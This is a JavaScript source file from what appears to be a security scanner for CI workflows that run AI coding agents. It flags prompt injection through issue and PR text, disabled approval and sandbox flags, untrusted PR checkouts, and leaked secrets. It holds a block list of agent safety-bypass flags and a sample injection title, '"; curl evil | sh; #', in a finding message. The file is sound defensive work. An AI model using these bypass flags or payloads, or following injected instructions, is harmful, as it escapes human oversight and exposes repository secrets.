import {
  ACTOR_GATE_RE, MODEL_SECRET_RE, PERMISSION_CHECK_ACTION_RE, PRIVILEGED_UNTRUSTED_TRIGGERS,
  UNPRIVILEGED_UNTRUSTED_TRIGGERS, ciWorkflowModel, untrustedRefs, writerRefs,

} from './ci-workflow.mjs';
import { locate } from './agentic-shim.mjs';

const BYPASS_RULES                                                               = [
  { re: /--dangerously-skip-permissions\b/, label: 'claude --dangerously-skip-permissions', severity: 'HIGH' },
  { re: /--permission-mode[= ]+['"]?bypassPermissions\b/i, label: 'claude --permission-mode bypassPermissions', severity: 'HIGH' },
  { re: /--dangerously-bypass-approvals-and-sandbox\b/, label: 'codex --dangerously-bypass-approvals-and-sandbox', severity: 'HIGH' },
  { re: /(?:--sandbox|(?:^|\s)-s)[= ]+['"]?danger-full-access\b|\bsandbox\s*[:=]\s*['"]?danger-full-access\b/im, label: 'sandbox danger-full-access', severity: 'HIGH' },
  { re: /\bsafety-strategy\s*[:=]\s*['"]?unsafe\b/i, label: 'codex-action safety-strategy: unsafe', severity: 'HIGH' },
  { re: /--approval-mode[= ]+['"]?yolo\b/i, label: '--approval-mode yolo', severity: 'HIGH' },
  { re: /(?:^|\s)--yolo\b/m, label: '--yolo', severity: 'HIGH' },
  { re: /--allow-all-tools\b|(?:^|\s)--allow-all\b/m, label: 'copilot --allow-all-tools', severity: 'HIGH' },
  { re: /--trust-all-tools\b/, label: '--trust-all-tools', severity: 'HIGH' },
  { re: /--yes-always\b/, label: 'aider --yes-always', severity: 'HIGH' },
  { re: /--dangerously-allow-all\b/, label: 'amp --dangerously-allow-all', severity: 'HIGH' },
  { re: /--skip-permissions-unsafe\b/, label: 'droid exec --skip-permissions-unsafe', severity: 'HIGH' },
  { re: /\bGOOSE_MODE\s{0,3}[:=]\s{0,3}['"]?auto\b/, label: 'GOOSE_MODE=auto', severity: 'HIGH' },
  { re: /\b(?:cursor-)?agent\b[^\n]*\s(?:--force|-f)\b/, label: 'cursor agent --force', severity: 'HIGH' },
  { re: /--allowed-?tools[= ]+['"]?[^'"\n]*(?:\bBash\b(?!\()|Bash\(\s*\*?\s*\)|Bash\(\*|["' ,]\*["' ,])/i, label: '--allowedTools with unscoped Bash', severity: 'HIGH' },
  { re: /(?:--ask-for-approval|(?:^|\s)-a)[= ]+['"]?never\b/m, label: 'codex --ask-for-approval never', severity: 'MEDIUM' },
  { re: /--full-auto\b/, label: 'codex --full-auto', severity: 'MEDIUM' },
];

const has = (s                           , re        ) => !!s && new RegExp(re.source, re.flags.replace('g', '')).test(s);
const uniq = (xs          ) => [...new Set(xs)];
const matchesOf = (s        , re        ) => uniq([...s.matchAll(new RegExp(re.source, re.flags.includes('g') ? re.flags : re.flags + 'g'))].map((m) => m[0])).slice(0, 8);

function agentSteps(wf            )           {
  return wf.jobs.flatMap((j) => j.steps.filter((s) => s.ai));
}

function jobOf(wf            , step        )        {
  return wf.jobs.find((j) => j.id === step.job) ;
}

function whoCanFire(wf            , step        )                                                      {
  const job = jobOf(wf, step);
  const gate = [job.if, step.if].find((c) => has(c, ACTOR_GATE_RE));
  if (gate) return { who: 'writers', why: `gated by \`if: ${gate.slice(0, 120)}\`` };
  const earlier = job.steps.filter((s) => s.index < step.index);
  if (earlier.some((s) => has(s.uses, PERMISSION_CHECK_ACTION_RE))) return { who: 'writers', why: 'a permission-check step runs first' };
  const w = step.with;
  if (step.ai?.product === 'claude-code-action') {
    const open = (w.allowed_non_write_users ?? '').trim();
    if (open === '*') return { who: 'open', why: 'allowed_non_write_users: "*" switches off the action\'s write-access check' };
    if (open) return { who: 'actors', why: `allowed_non_write_users lets ${open.slice(0, 80)} fire it without write access` };
    return { who: 'writers', why: 'claude-code-action only runs for actors with write access by default' };
  }
  if (step.ai?.product === 'codex-action') {
    const open = (w['allow-users'] ?? '').trim();
    if (open === '*') return { who: 'open', why: 'allow-users: "*" switches off the action\'s write-access check' };
    if (open) return { who: 'actors', why: `allow-users lets ${open.slice(0, 80)} fire it` };
    return { who: 'writers', why: 'codex-action requires write access by default' };
  }
  return { who: 'open', why: 'no actor condition on the job or step, and the step has no write-access check of its own' };
}

const GEMINI_EFFECT =
  'Before the fix, a headless run trusted the checked-out workspace\'s own settings and ignored its tool allow-list under --yolo, so a file in the checkout or an instruction in an issue or comment could run any command - including reading the Git credentials actions/checkout leaves on disk.';
const GEMINI_ACTION_FLAW            = { pkg: 'google-github-actions/run-gemini-cli', fixed: '0.1.22', advisory: 'GHSA-wpqr-6v78-jr5g', effect: GEMINI_EFFECT };
const GEMINI_CLI_FLAW            = { pkg: '@google/gemini-cli', fixed: '0.39.1', advisory: 'GHSA-wpqr-6v78-jr5g', effect: GEMINI_EFFECT };
const CLAUDE_CODE_FLAW            = {
  pkg: '@anthropic-ai/claude-code',
  fixed: '2.1.163',
  from: '0.2.54',
  advisory: 'CVE-2026-54316',
  effect:
    'From 0.2.54 until the fix, WebFetch reached any huggingface.co address without asking, even under a narrowed tool list, and each fetch of an attacker\'s repository is counted there as a download - a way out for anything an injected instruction reads.',
};

const SEMVER_RE = /^v?(\d+)\.(\d+)\.(\d+)(-[\w.]+)?$/;
const PINNED_CLI_RE = /(@google\/gemini-cli|@anthropic-ai\/claude-code)@(v?\d+\.\d+\.\d+(?:-[\w.]+)?)(?![\w.-])/g;

function flawedVersion(version                           , flaw           )          {
  const v = SEMVER_RE.exec((version ?? '').trim().replace(/^['"]|['"]$/g, ''));
  if (!v) return false;
  const order = (b        ) => {
    const o = SEMVER_RE.exec(b) ;
    for (let i = 1; i <= 3; i++) if (Number(v[i]) !== Number(o[i])) return Number(v[i]) - Number(o[i]);
    return 0;
  };
  return order(flaw.fixed) < 0 && (!flaw.from || order(flaw.from) >= 0);
}

const cliIgnoresAllowList = (step        ) => step.ai?.product === 'run-gemini-cli' && flawedVersion(step.with.gemini_cli_version, GEMINI_CLI_FLAW);

function unattended(step        )                                                                       {
  const out                                                                       =
    BYPASS_RULES.filter((r) => has(step.inputText, r.re)).map(({ label, severity }) => ({ label, severity }));
  if (step.ai?.product === 'run-gemini-cli' && !/"core"\s*:/.test(step.with.settings ?? '')) {
    out.push({ label: 'run-gemini-cli always runs --yolo, and no settings.tools.core allow-list narrows it', severity: 'HIGH', implicit: true });
  } else if (cliIgnoresAllowList(step)) {
    out.push({ label: `Gemini CLI ${step.with.gemini_cli_version.trim()} ignores the settings.tools.core allow-list under --yolo`, severity: 'HIGH', implicit: true });
  }
  if (step.ai?.product === 'ai-inference' && /^true$/i.test((step.with['enable-github-mcp'] ?? '').trim())) {
    out.push({ label: 'ai-inference with enable-github-mcp: true', severity: 'MEDIUM', implicit: true });
  }
  return out;
}

const MODEL_AUTH_INPUTS = new Set(['anthropic_api_key', 'claude_code_oauth_token', 'openai-api-key', 'openai_api_key', 'gemini_api_key', 'google_api_key', 'github_token']);
const PROVIDER_WORD_RE = /OPENAI|ANTHROPIC|CLAUDE|GEMINI|COPILOT|GOOGLE_AI|GOOGLE_GENERATIVE|MISTRAL|GROQ|OPENROUTER|DEEPSEEK|XAI/i;
const isModelAuthInput = (k        ) => MODEL_AUTH_INPUTS.has(k.toLowerCase()) || (PROVIDER_WORD_RE.test(k) && /(?:KEY|TOKEN)$/i.test(k));

const WRITE_TOOL_RE = /\b(?:Write|Edit|MultiEdit|NotebookEdit)\b|\bBash\b(?!\()|Bash\(\s*\*|write_file|replace\b|run_shell_command(?!\()/;

function capabilityOf(step        )                                                          {
  const w = step.with;
  if (step.ai?.kind === 'reviewer') return { level: 'restricted', why: 'a review bot with a fixed tool set' };
  if (step.ai?.product === 'codex-action' && (/read-only/.test(w.sandbox ?? '') || /read-only/.test(w['permission-profile'] ?? '') || /read-only/.test(w['safety-strategy'] ?? ''))) {
    return { level: 'restricted', why: 'codex runs with a read-only sandbox' };
  }
  const settings = w.settings ?? '';
  if (step.ai?.product === 'run-gemini-cli' && !cliIgnoresAllowList(step) && /"core"\s*:\s*\[([^\]]*)\]/.test(settings) && !WRITE_TOOL_RE.test(/"core"\s*:\s*\[([^\]]*)\]/.exec(settings) [1])) {
    return { level: 'restricted', why: 'settings.tools.core narrows the Gemini tools' };
  }
  const list = /--allowed-?tools[= ]+(?:"([^"]*)"|'([^']*)'|(\S+))/i.exec(step.inputText) ?? /\ballowed_tools:\s*(.+)/i.exec(step.inputText);
  const tools = list ? (list[1] ?? list[2] ?? list[3] ?? '') : '';
  if (tools && !WRITE_TOOL_RE.test(tools)) return { level: 'restricted', why: `the tool list is limited to ${tools.slice(0, 100)}` };
  return { level: 'default', why: null };
}

const REPO_WRITE_SCOPES = ['contents', 'pull-requests', 'actions', 'packages', 'deployments', 'security-events', 'checks', 'statuses', 'workflows', 'pages'];

const GH_TOKEN_KEY_RE = /^(?:github[_-]token|gh[_-]token|github[_-]pat|gh[_-]pat)$/i;
const BUILT_IN_TOKEN_RE = /^\s*\$\{\{\s*(?:secrets\.GITHUB_TOKEN|github\.token)\s*\}\}\s*$/i;

const tokenInputs = (step        ) =>
  [...Object.entries(step.with), ...Object.entries(step.scopeEnv)].filter(([k, v]) => GH_TOKEN_KEY_RE.test(k) && v.trim());

function storedToken(step        )                                         {
  if (step.ai?.product === 'copilot') return null;
  for (const [key, v] of tokenInputs(step)) {
    const secret = [...v.matchAll(/\bsecrets\.([\w-]+)/g)].map((m) => m[1]).find((s) => !/^GITHUB_TOKEN$/i.test(s));
    if (secret) return { key, secret };
  }
  return null;
}

const reachedByOutsiders = (ctx          , step        ) => ctx.privileged.length > 0 || untrustedRefs(step.inputText).length > 0;

function narrowToken(wf            , step        )          {
  if (tokenInputs(step).some(([, v]) => !BUILT_IN_TOKEN_RE.test(v))) return false;
  const perms = jobOf(wf, step).permissions ?? wf.permissions;
  if (perms === 'read-all' || (perms && typeof perms === 'object' && !Object.keys(perms          ).length)) return true;
  if (!perms || typeof perms !== 'object') return false;
  return !REPO_WRITE_SCOPES.some((k) => (perms                           )[k] === 'write');
}

function triggerFindings(ctx          , step        )                    {
  const { a, privileged } = ctx;
  if (!privileged.length || step.ai?.kind === 'model') return [];
  const fire = whoCanFire(ctx.wf, step);
  if (fire.who === 'writers') return [];
  const flags = unattended(step);
  const cap = capabilityOf(step);
  const narrow = narrowToken(ctx.wf, step);
  const sev = flags.some((f) => f.severity === 'HIGH') && fire.who === 'open' ? 'CRITICAL'
    : fire.who === 'open' && cap.level === 'default' && !narrow ? 'HIGH' : 'MEDIUM';
  return [{
    class: 'PROMPT_INJECTION',
    severity: sev,
    title: `Agent step "${step.id ?? step.ai .product}" in "${a.name}" can be summoned by ${fire.who === 'open' ? 'anyone' : 'named non-writers'} on ${privileged.join(', ')}`,
    detail:
      `${fire.why}. ${privileged.join(', ')} runs in the base repository with its secrets and a write-capable token, and the agent reads the triggering issue, comment or PR itself - so whoever can open one writes part of its instructions, with no \`\${{ }}\` needed in the prompt.` +
      (flags.length
        ? ` The step also runs unattended (${flags.map((f) => f.label).join('; ')}), so an injected instruction executes without review.`
        : cap.why ? ` Its reach is narrowed (${cap.why}), so a steered run is bounded by that list - which is the part to keep tight.`
          : narrow ? ' Its job token can write only issue / discussion content, so a steered run is bounded to what that token and the agent\'s default tools allow.' : ''),
    remediationText:
      'Gate the job on the actor (`author_association` in OWNER/MEMBER/COLLABORATOR, or a permission check) and keep the action\'s write-access check on; give the agent read-only tools and a read-only token for anything it does on untrusted threads.',
    remediationTier: 1,
    evidence: { step: step.id, product: step.ai .product, triggers: privileged, gate: fire.why, capability: cap.why, unattended: flags.map((f) => f.label), path: a.path, ...locate(step.uses ?? step.ai .product, a.content) },
  }];
}

function interpolationFindings(ctx          , step        )                    {
  const { a, privileged, forkOnly } = ctx;
  const untrusted = untrustedRefs(step.inputText);
  const writer = writerRefs(step.inputText);
  if (!untrusted.length && !writer.length) return [];
  const exprs = untrusted.length ? untrusted : writer;

  const narrow = capabilityOf(step).level === 'restricted' && !unattended(step).length;
  const sev                              = !untrusted.length ? 'LOW' : privileged.length ? (narrow ? 'MEDIUM' : 'HIGH') : forkOnly.length ? 'MEDIUM' : 'LOW';
  const onEnv = !exprs.some((e) => (step.run ?? '').includes(e) || Object.values(step.with).some((v) => v.includes(e)));
  return [{
    class: 'PROMPT_INJECTION',
    severity: sev,
    title: `Workflow "${a.name}" feeds ${untrusted.length ? 'attacker-controllable' : 'dispatcher-supplied'} text to agent step "${step.id ?? step.ai .product}"${onEnv ? ' through an environment variable' : ''}`,
    detail:
      `${exprs.slice(0, 4).join(', ')} reach${exprs.length === 1 ? 'es' : ''} the agent${onEnv ? ' through an environment variable' : ''}` +
      (privileged.length && untrusted.length ? `, on ${privileged.join(', ')} - a trigger that carries repository secrets and a write-scoped token` : '') +
      '. An environment variable stops SHELL injection; it does not stop PROMPT injection - the agent still reads the text as part of its task, and anyone who can write it can write instructions.',
    remediationText:
      'Do not put issue, comment, PR or commit text in the prompt of an agent that holds secrets or write tools. If it must read untrusted text, run it read-only with no secrets beyond the model key, and treat its output as untrusted data.',
    remediationTier: 1,
    evidence: { expressions: exprs, step: step.id, product: step.ai .product, triggers: ctx.wf.triggers, viaEnv: onEnv, path: a.path, ...locate(exprs[0], a.content) },
  }];
}

function bypassFindings(ctx          , step        )                    {
  const flags = unattended(step);
  if (!flags.length) return [];
  const exposed = ctx.privileged.length > 0 || untrustedRefs(step.inputText).length > 0;
  const top = flags.find((f) => f.severity === 'HIGH') ?? flags[0];
  return [{
    class: 'INSECURE_CONFIG',

    severity: top.severity === 'HIGH' ? (exposed ? 'CRITICAL' : flags.every((x) => x.implicit) ? 'MEDIUM' : 'HIGH') : 'MEDIUM',
    title: `Workflow "${ctx.a.name}" runs an agent with approvals disabled`,
    detail:
      `Agent step "${step.id ?? step.ai .product}" uses ${flags.map((f) => f.label).join('; ')}. In CI there is no human to approve anything, so the agent executes whatever it decides, with the runner's credentials and network` +
      (exposed ? ' - on a workflow that attacker-authored text reaches, so an injected instruction executes unreviewed.' : '.'),
    remediationText: 'Remove the bypass and give the CI agent an explicit allow-list of narrow tools (e.g. `Bash(npm test)`, `gh pr comment`), with the sandbox on.',
    remediationTier: 1,
    evidence: { flags: flags.map((f) => f.label), step: step.id, triggers: ctx.wf.triggers, path: ctx.a.path, ...locate(flagNeedle(step, flags[0].label), ctx.a.content) },
  }];
}

function flagNeedle(step        , label        )                  {
  const rule = BYPASS_RULES.find((r) => r.label === label);
  return rule ? rule.re : step.uses ?? label;
}

const UNTRUSTED_CHECKOUT_RE = /github\.event\.pull_request\.head\.(?:sha|ref)|github\.head_ref|github\.event\.workflow_run\.head_(?:sha|branch)|refs\/pull\/|\bpull\/\$\{\{/i;

function checkoutFindings(ctx          , step        )                    {
  const triggers = ctx.wf.triggers.filter((t) => t === 'pull_request_target' || t === 'workflow_run' || t === 'issue_comment');
  if (!triggers.length) return [];
  const job = jobOf(ctx.wf, step);
  const checkout = job.steps.find((s) => s.index < step.index && (
    (has(s.uses, /^actions\/checkout\b/i) && has(s.with.ref ?? '', UNTRUSTED_CHECKOUT_RE)) ||
    has(s.run, /\bgh\s+pr\s+checkout\b|git\s+(?:fetch|checkout)[^\n]*(?:refs\/pull\/|\bpull\/|github\.event\.pull_request\.head)/i)
  ));
  if (!checkout) return [];
  const trusted = /gemini/i.test(step.ai?.product ?? '') && /^['"]?(?:true|1)['"]?$/i.test((step.scopeEnv.GEMINI_TRUST_WORKSPACE ?? '').trim());
  return [{
    class: 'PROMPT_INJECTION',
    severity: 'CRITICAL',
    title: `Workflow "${ctx.a.name}" runs an agent on a pull request's own code with base-repo secrets`,
    detail:
      `On ${triggers.join(', ')}, step ${checkout.index + 1} checks out the PR head before agent step "${step.id ?? step.ai .product}". The agent then loads that tree's CLAUDE.md / AGENTS.md / .cursor rules, .mcp.json servers and settings as its own configuration - all authored by whoever opened the PR - while holding the base repository's secrets and write token.` +
      (trusted ? ' `GEMINI_TRUST_WORKSPACE: true` also tells Gemini CLI to trust that tree, so its `.gemini/` settings and `.env` load before the sandbox starts - the setting Google says is only for trusted input.' : ''),
    remediationText:
      'Run agents that must see PR code on `pull_request` (fork: no secrets), or check the PR out into a subdirectory the agent does not treat as its project root, with project instruction files, MCP config and hooks disabled.',
    remediationTier: 1,
    evidence: { triggers, checkoutStep: checkout.index + 1, step: step.id, path: ctx.a.path, ...locate(checkout.with.ref ?? 'gh pr checkout', ctx.a.content) },
  }];
}

const ACTION_METADATA_OUTPUT_RE = /^(?:execution_file|conclusion|branch_name|github_token|session_id|exit_?code|duration(?:_ms)?|num_turns|(?:total_)?cost(?:_usd)?|usage|run_id)$/i;

function authoredOutputExpr(text                           , stepId        )                     {
  const ref = new RegExp(String.raw`\bsteps\.${stepId.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\.outputs\.([\w-]+)`, 'g');
  for (const expr of String(text ?? '').match(/\$\{\{(?:[^}]|\}(?!\}))*\}\}/g) ?? []) {
    if ([...expr.matchAll(ref)].some((m) => !ACTION_METADATA_OUTPUT_RE.test(m[1]))) return expr;
  }
  return undefined;
}

function outputFindings(ctx          , step        )                    {
  if (!step.id) return [];
  const job = jobOf(ctx.wf, step);
  const sinkExpr = (s        ) => authoredOutputExpr(s.run, step.id ) ?? (has(s.uses, /^actions\/github-script\b/) ? authoredOutputExpr(s.with.script, step.id ) : undefined);
  const sink = job.steps.find((s) => s.index > step.index && sinkExpr(s));
  if (!sink) return [];
  const expr = sinkExpr(sink) ;
  return [{
    class: 'INJECTION_FLAW',
    severity: 'HIGH',
    title: `Workflow "${ctx.a.name}" executes the agent's output as code`,
    detail: `${expr} is interpolated into ${sink.run ? 'a `run:` script' : 'a github-script body'} (step ${sink.index + 1}). The expression is substituted before the shell parses it, so whatever the model returns - including text an injected instruction made it return - runs as a command with the job's token.`,
    remediationText: 'Pass the agent output through an environment variable and treat it as data (quote it, validate it against an expected shape); never splice it into a script.',
    remediationTier: 1,
    evidence: { expression: expr, producer: step.id, sinkStep: sink.index + 1, path: ctx.a.path, ...locate(expr, ctx.a.content) },
  }];
}

function reachFindings(ctx          , step        )                    {
  const out                    = [];
  const job = jobOf(ctx.wf, step);
  const perms = job.permissions ?? ctx.wf.permissions;

  if (perms === 'write-all' && (ctx.privileged.length || ctx.forkOnly.length)) {
    out.push({
      class: 'OVER_PERMISSIONED',
      severity: 'MEDIUM',
      title: `Agent job "${job.id}" in "${ctx.a.name}" holds a write-all token`,
      detail: `The job that runs the agent on ${[...ctx.privileged, ...ctx.forkOnly].join(', ')} is granted \`permissions: write-all\`. Anything an injected instruction makes the agent do, it does with that reach.`,
      remediationText: 'Declare the minimum per-job permissions the agent needs (usually contents: read plus one write scope it posts with).',
      remediationTier: 2,
      evidence: { job: job.id, permissions: perms, path: ctx.a.path, ...locate('write-all', ctx.a.content) },
    });
  }

  const holders = [...Object.entries(step.scopeEnv), ...Object.entries(step.with)].filter(([k]) => !isModelAuthInput(k) && !GH_TOKEN_KEY_RE.test(k)).map(([, v]) => v);
  const secrets = uniq(matchesOf(holders.join('\n'), /\$\{\{\s*secrets\.([\w-]+)\s*\}\}/g).map((m) => /secrets\.([\w-]+)/.exec(m) [1]))
    .filter((s) => !MODEL_SECRET_RE.test(s));
  if (secrets.length && (ctx.privileged.length || untrustedRefs(step.inputText).length > 0)) {
    out.push({
      class: 'TOXIC_FLOW',
      severity: 'HIGH',
      title: `Agent step "${step.id ?? step.ai .product}" in "${ctx.a.name}" holds secrets beyond its model key`,
      detail: `${secrets.slice(0, 6).join(', ')} ${secrets.length === 1 ? 'is' : 'are'} handed to an agent that attacker-authored text reaches. The model key is the one credential it needs; every other secret in its environment is something an injected instruction can print into a comment, a branch or a request.`,
      remediationText: 'Give the agent step only the model credential and the default GITHUB_TOKEN; run anything that needs other secrets in a separate job that consumes the agent\'s output as data.',
      remediationTier: 1,
      evidence: { secrets, step: step.id, path: ctx.a.path, ...locate(`secrets.${secrets[0]}`, ctx.a.content) },
    });
  }
  if (step.ai?.product === 'claude-code-action' && (step.with.allowed_bots ?? '').trim() === '*') {
    out.push({
      class: 'WEAK_AUTH',
      severity: 'MEDIUM',
      title: `claude-code-action in "${ctx.a.name}" accepts any bot`,
      detail: '`allowed_bots: "*"` lets any GitHub App fire the agent with a prompt it controls, and allowed bots are not checked for repository permissions.',
      remediationText: 'List the specific bots that may trigger the agent.',
      remediationTier: 2,
      evidence: { path: ctx.a.path, ...locate('allowed_bots', ctx.a.content) },
    });
  }
  return out;
}

function storedTokenFindings(ctx          , step        )                    {
  const t = storedToken(step);
  if (!t) return [];
  const exposed = reachedByOutsiders(ctx, step);
  return [{
    class: 'WEAK_AUTH',
    severity: exposed ? 'HIGH' : 'MEDIUM',
    title: `Agent step "${step.id ?? step.ai .product}" in "${ctx.a.name}" acts with a stored GitHub token, not the job's own`,
    detail:
      `\`${t.key}\` is \`secrets.${t.secret}\`. The workflow's \`permissions:\` block narrows only the job's own GITHUB_TOKEN, which also expires when the job ends. A stored personal or bot token keeps its owner's reach across every repository it can see and is the same token on every run, so an injected instruction that leaks a piece of it each time still ends up with all of it.` +
      (exposed ? ' This agent reads text an outsider wrote.' : ''),
    remediationText:
      'Pass `github_token: ${{ secrets.GITHUB_TOKEN }}` and declare the job\'s permissions. If the job token cannot do what the agent needs, mint a short-lived GitHub App token scoped to this repository (actions/create-github-app-token) instead of a personal one.',
    remediationTier: 1,
    evidence: { key: t.key, secret: t.secret, step: step.id, product: step.ai .product, path: ctx.a.path, ...locate(`secrets.${t.secret}`, ctx.a.content) },
  }];
}

const isClaude = (step        ) => /^(?:claude-code-action|claude|claude-code)$/.test(step.ai?.product ?? '');
const SCRUB_OFF_RE = /\bCLAUDE_CODE_SUBPROCESS_ENV_SCRUB\b["']?\s*[:=]\s*["']?0(?![\w.])/;

function leakFindings(ctx          , step        )                    {
  if (!isClaude(step)) return [];
  const out                    = [];
  const exposed = reachedByOutsiders(ctx, step);
  const name = step.id ?? step.ai .product;
  if (/^['"]?0['"]?$/.test((step.scopeEnv.CLAUDE_CODE_SUBPROCESS_ENV_SCRUB ?? '').trim()) || SCRUB_OFF_RE.test(step.inputText)) {
    out.push({
      class: 'INSECURE_CONFIG',
      severity: exposed ? 'HIGH' : 'MEDIUM',
      title: `Workflow "${ctx.a.name}" switches off Claude's secret scrubbing for agent step "${name}"`,
      detail:
        '`CLAUDE_CODE_SUBPROCESS_ENV_SCRUB: 0` stops Claude Code removing Anthropic, cloud and GitHub Actions secrets from the environment of the commands it runs, so one `env` or `printenv` from an injected instruction reads them all.' +
        (exposed ? ' This agent reads text an outsider wrote.' : ''),
      remediationText: 'Remove the opt-out. If a command genuinely needs a secret, run it in a separate step the agent does not control.',
      remediationTier: 1,
      evidence: { step: step.id, product: step.ai .product, path: ctx.a.path, ...locate('CLAUDE_CODE_SUBPROCESS_ENV_SCRUB', ctx.a.content) },
    });
  }
  if (step.ai?.product === 'claude-code-action' && /^['"]?true['"]?$/i.test((step.with.show_full_output ?? '').trim())) {
    out.push({
      class: 'INSECURE_CONFIG',
      severity: exposed ? 'HIGH' : 'MEDIUM',
      title: `Workflow "${ctx.a.name}" prints everything agent step "${name}" sees into the Actions log`,
      detail:
        '`show_full_output: true` writes every tool result to the job log - file contents, command output, `env`. On a public repository that log is public, so whatever an injected instruction makes the agent read leaves through the log, with no network call to stop.' +
        (exposed ? ' This agent reads text an outsider wrote.' : ''),
      remediationText: 'Turn show_full_output off outside a private debugging run.',
      remediationTier: 1,
      evidence: { step: step.id, path: ctx.a.path, ...locate('show_full_output', ctx.a.content) },
    });
  }
  return out;
}

function flawedPinFindings(ctx          , step        )                    {
  const pins                                                         = [];
  if (step.ai?.product === 'run-gemini-cli') {
    const ref = (step.uses ?? '').split('@')[1] ?? '';
    if (flawedVersion(ref, GEMINI_ACTION_FLAW)) pins.push({ flaw: GEMINI_ACTION_FLAW, version: ref, needle: step.uses  });
    if (flawedVersion(step.with.gemini_cli_version, GEMINI_CLI_FLAW)) pins.push({ flaw: GEMINI_CLI_FLAW, version: step.with.gemini_cli_version.trim(), needle: 'gemini_cli_version' });
  }
  for (const s of jobOf(ctx.wf, step).steps) {
    for (const m of (s.run ?? '').slice(0, 200_000).matchAll(PINNED_CLI_RE)) {
      const flaw = m[1] === GEMINI_CLI_FLAW.pkg ? GEMINI_CLI_FLAW : CLAUDE_CODE_FLAW;
      if (flawedVersion(m[2], flaw)) pins.push({ flaw, version: m[2], needle: m[0] });
    }
  }
  const exposed = reachedByOutsiders(ctx, step);
  return pins.map(({ flaw, version, needle }) => ({
    class: 'BAD_DEPENDENCY',
    severity: exposed ? 'HIGH' : 'MEDIUM',
    title: `Workflow "${ctx.a.name}" pins ${flaw.pkg} ${version}, which has a known agent flaw (${flaw.advisory})`,
    detail: `${flaw.pkg} is fixed in ${flaw.fixed}. ${flaw.effect}` + (exposed ? ' This workflow hands the agent text an outsider wrote, which is the input the flaw needs.' : ''),
    remediationText: `Move ${flaw.pkg} to ${flaw.fixed} or later.`,
    remediationTier: 1,
    evidence: { package: flaw.pkg, version, fixed: flaw.fixed, advisory: flaw.advisory, step: step.id, path: ctx.a.path, ...locate(needle, ctx.a.content) },
  }));
}

function scriptInjectionFindings(a                  , wf            , privileged          )                    {
  if (wf.vendor !== 'github' || !privileged.length) return [];
  const out                    = [];
  for (const s of wf.jobs.flatMap((j) => j.steps)) {
    if (s.ai || !s.run) continue;
    const exprs = untrustedRefs(s.run);
    if (!exprs.length) continue;
    out.push({
      class: 'INJECTION_FLAW',
      severity: 'HIGH',
      title: `Workflow "${a.name}" splices attacker text into a shell script`,
      detail: `${exprs.slice(0, 3).join(', ')} is interpolated directly into a \`run:\` script on ${privileged.join(', ')}. The expression is substituted before bash parses the line, so a title such as \`"; curl evil | sh; #\` runs with the job's secrets.`,
      remediationText: 'Pass the value through `env:` and reference it as "$VAR" in the script.',
      remediationTier: 1,
      evidence: { expressions: exprs, path: a.path, ...locate(exprs[0], a.content) },
    });
    if (out.length >= 5) break;
  }
  return out;
}

export function agenticCiFindings(a                  )                    {
  const wf = ciWorkflowModel(a.path, a.content ?? '');
  if (!wf) return [];
  const privileged = wf.triggers.filter((t) => PRIVILEGED_UNTRUSTED_TRIGGERS.has(t));
  const forkOnly = wf.triggers.filter((t) => UNPRIVILEGED_UNTRUSTED_TRIGGERS.has(t));
  const ctx           = { a, wf, privileged, forkOnly };
  const out                    = [];
  for (const step of agentSteps(wf).slice(0, 20)) {
    out.push(
      ...triggerFindings(ctx, step), ...interpolationFindings(ctx, step), ...bypassFindings(ctx, step),
      ...checkoutFindings(ctx, step), ...outputFindings(ctx, step), ...reachFindings(ctx, step),
      ...storedTokenFindings(ctx, step), ...leakFindings(ctx, step), ...flawedPinFindings(ctx, step),
    );
  }
  out.push(...scriptInjectionFindings(a, wf, privileged));
  return dedupe(out);
}

function dedupe(fs                   )                    {
  const seen = new Set        ();
  return fs.filter((f) => {
    const k = `${f.class}|${f.title}`;
    if (seen.has(k)) return false;
    seen.add(k);
    return true;
  });
}

export { ciWorkflowModel };

